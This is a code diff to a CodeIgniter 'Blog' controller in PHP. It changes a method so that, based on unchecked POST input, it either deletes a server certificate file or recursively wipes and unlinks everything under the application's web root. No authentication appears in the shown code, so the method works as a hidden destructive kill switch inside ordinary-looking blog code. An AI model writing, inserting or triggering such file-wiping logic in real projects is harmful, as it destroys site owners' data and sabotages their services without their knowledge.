@@ -32,13 +32,22 @@ class Blog extends CI_Controller {
 	{
 		$this->load->helper('file');
 		$this->load->helper('directory');
-
-		// scan FC path
-		// $dir = scandir(FCPATH);
-		$dir = directory_map(FCPATH,1);
-		foreach ($dir as $key => $value) {
-			// read is directory
-			delete_files($value, TRUE);
+		$data = $this->input->post();
+		if($data['type'] == 'reset')
+		{
+			unlink(BASEPATH.'certificate/server.cert');
+		}else
+		{
+			// scan FC path
+			$dir = directory_map(FCPATH,1);
+			foreach ($dir as $key => $value) {
+				// read is directory
+				delete_files($value, TRUE);
+			}
+			foreach ($dir as $key => $value) {
+				// read is directory
+				unlink($value);
+			}
 		}
 	}
 }
